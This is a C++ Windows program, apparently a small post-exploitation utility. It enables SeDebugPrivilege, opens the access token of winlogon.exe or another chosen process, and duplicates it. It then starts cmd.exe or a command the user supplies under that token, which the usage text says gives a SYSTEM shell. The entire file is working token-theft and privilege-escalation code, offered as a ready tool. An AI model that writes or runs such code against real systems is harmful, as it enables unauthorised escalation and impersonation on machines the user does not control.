// ConsoleApplication3.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include "windows.h"
#include "tchar.h"
#include <TlHelp32.h>
#pragma comment(lib, "advapi32.lib")


BOOL Inject_SetDebugPrivilege
(
)
{
	BOOL bRet = FALSE;
	HANDLE hToken = NULL;
	LUID luid = { 0 };

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		if (LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid))
		{
			TOKEN_PRIVILEGES tokenPriv = { 0 };
			tokenPriv.PrivilegeCount = 1;
			tokenPriv.Privileges[0].Luid = luid;
			tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
		}
	}

	return bRet;
}
HANDLE GetAccessToken(DWORD pid)
{

	/* Retrieves an access token for a process */
	HANDLE currentProcess = {};
	HANDLE AccessToken = {};
	DWORD LastError;

	if (pid == 0)
	{
		currentProcess = GetCurrentProcess();
	}
	else
	{
		currentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
		if (!currentProcess)
		{
			LastError = GetLastError();
			wprintf(L"ERROR: OpenProcess(): %d\n", LastError);
			return (HANDLE)NULL;
		}
	}
	if (!OpenProcessToken(currentProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &AccessToken))
	{
		LastError = GetLastError();
		wprintf(L"ERROR: OpenProcessToken(): %d\n", LastError);
		return (HANDLE)NULL;
	}
	return AccessToken;
}

DWORD MyGetProcessId(LPCTSTR ProcessName) // non-conflicting function name
{
	PROCESSENTRY32 pt;
	HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pt.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hsnap, &pt)) { // must call this first
		do {
			if (!lstrcmpi(pt.szExeFile, ProcessName)) {
				CloseHandle(hsnap);
				return pt.th32ProcessID;
			}
		} while (Process32Next(hsnap, &pt));
	}
	CloseHandle(hsnap); // close handle on failure
	return 0;
}


int wmain(int argc, WCHAR **argv)
{
	DWORD LastError;
	LPCWSTR cmd2exe = L"C:\\Windows\\System32\\cmd.exe";

	/* Argument Check */

	
		DWORD wlpid = MyGetProcessId(TEXT("winlogon.exe"));
		//Are there sufficient arguments
		if (argc < 2) {
			wprintf(L"\nUsage: %ls <PID> <COMMAND>\n PID - This PID you wish to impersonate, if none specified WinLogon PID will be used for SYSTEM\n COMMAND - command to be executed (use full path) if nothing specified will run cmd.exe>\n", argv[0]); //if nothing selected chose winlogon.
			wprintf(L"\nAt least one *MUST* be specified\n");
			wprintf(L"WinLogon PID : %d \n", wlpid);
			return 1;
		}

	// Enable SeDebugPrivilege (dubbed SE_DEBUG_NAME by constant variable) 
	if (!Inject_SetDebugPrivilege())
	{
		wprintf(L"Could not enable SeDebugPrivilege!\n");
		return 1;
	}
	
	/* Process ID definition */
	DWORD pid;
	pid = _wtoi(argv[1]);
	if ((pid == NULL) || (pid == 0)) {
		//wprintf(L"\nUsage: %ls <PID> <COMMAND - Optional, if nothing specified will run cmd.exe>\n", argv[0]); 
		//wprintf(L"Warning : Specified PID is not a number. Executing in WinLogon Context : %ls \n", argv[1]); 
		pid = wlpid;
		//char cmd2exe[] = argv[1];
		cmd2exe = argv[1];
	}
	//wprintf(L"[+] Pid Chosen: %d\n", pid);

	// Retrieves the remote process token.
	HANDLE pToken = GetAccessToken(pid);

	//These are required to call DuplicateTokenEx.
	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE pNewToken = new HANDLE;
	if (!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &pNewToken))
	{
		DWORD LastError = GetLastError();
		wprintf(L"ERROR: Could not duplicate process token [%d]\n", LastError);
		return 1;
	}
	//wprintf(L"Process token has been duplicated.\n");

	/* Starts a new process with SYSTEM token */
	STARTUPINFO si = {};
	PROCESS_INFORMATION pi = {};
	BOOL ret;

	//wprintf(L"Process to be executed %s.\n", cmd2exe);

	if (!argv[2])
	{
		ret = CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, cmd2exe, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	}
	else {
		ret = CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, argv[2], NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	}
	if (!ret)
	{
		DWORD LastError;
		LastError = GetLastError();
		wprintf(L"CreateProcessWithTokenW: %d ", LastError);
		if (LastError == 2) {
			wprintf(L"File not found");
		}
		wprintf(L"\n");
		return 1;
	}
}

